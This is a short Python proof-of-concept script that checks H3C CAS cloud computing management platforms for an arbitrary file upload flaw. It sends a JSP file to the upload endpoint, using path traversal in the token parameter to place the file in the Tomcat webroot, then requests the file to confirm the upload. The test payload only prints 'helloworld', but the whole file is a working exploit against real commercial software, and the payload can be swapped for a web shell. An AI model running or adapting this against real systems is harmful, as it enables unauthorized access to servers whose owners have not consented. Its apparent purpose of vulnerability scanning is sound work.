#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from urllib import response
import requests
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = 'H3c_CAS_fileupload'
AUTHOR = "JDQ"
REMARK = 'cas 云计算管理平台文件上传'
FOFA_RULE = ''
######################################################


data = r'''<% out.println("helloworld");%>
'''


def poc(target):
    headers = {
        "User-Agent": ua,
        "Content-range": "bytes 0-10/20",
        'Referer': target+"/cas/"
    }
    try:
        r = requests.post(target+'/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/5.jsp&name=222', data=data,
                          headers=headers, verify=False, timeout=5)
        if r.status_code == 200 and 'success' in r.text:
            r = requests.get(target+'/cas/js/lib/buttons/5.jsp')
            print("[+] 目标 {} 存在漏洞".format(target), r.text)

    except Exception as e:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
